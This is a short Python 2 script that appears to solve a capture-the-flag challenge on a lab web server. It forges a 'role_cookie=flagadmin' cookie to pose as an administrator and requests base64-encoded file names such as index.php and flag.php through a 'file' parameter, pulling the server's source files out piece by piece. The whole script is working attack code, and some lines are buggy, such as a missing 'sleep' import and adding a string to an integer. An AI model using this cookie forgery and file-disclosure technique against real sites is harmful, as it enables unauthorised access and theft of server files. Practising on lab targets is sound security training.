#!/usr/bin/env python
# coding: utf-8

import requests

r = requests.session()
url = 'http://question11.erangelab.com/flag_manager/index.php'
headers = {"Cookie": "role_cookie=flagadmin"}
payload = {'file': 'aW5kZXgucGhw', 'num': 0}
# payload = {'file': 'ZmxhZy5waHA=', 'num': 0}
keyword = '?>'
# keyword = '}'
filetext = ''

for i in range(30):
    payload['num'] = i
    try:
        result = r.get(url, params=payload, headers=headers)
        filetext += result.content
        if keyword in result.content:
            print 'done!'
            break
        print 'receive: ' + i
    except Exception as e:
        print '**', e
        break
    sleep(1)

print filetext
